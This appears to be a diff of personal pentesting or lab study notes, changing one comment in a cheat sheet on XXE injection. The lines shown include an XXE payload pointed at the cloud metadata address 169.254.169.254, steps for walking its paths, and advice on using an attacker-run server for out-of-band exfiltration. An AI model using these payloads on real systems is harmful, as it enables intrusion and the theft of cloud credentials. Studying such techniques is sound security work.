@@ -372,7 +372,7 @@ sudo openvpn nmap -sV {target IP}
 [+] {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>} change file path to IP address of server ypu want to commuicate with 
 - clear the product ID, add <xxe;>
 - if the error message prompts you to a dir, add the dir to your payload path e.g {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/new_path"> ]>}
-// if faced with a case of no tangible error messages pointing to directories, try and run your own server and place in the payload path to replace the IP
+// if faced with a case of no tangible error messages pointing to directories, try and run your own server and place your server IP in the payload path to replace the web's server IP
 
 
 *******************************
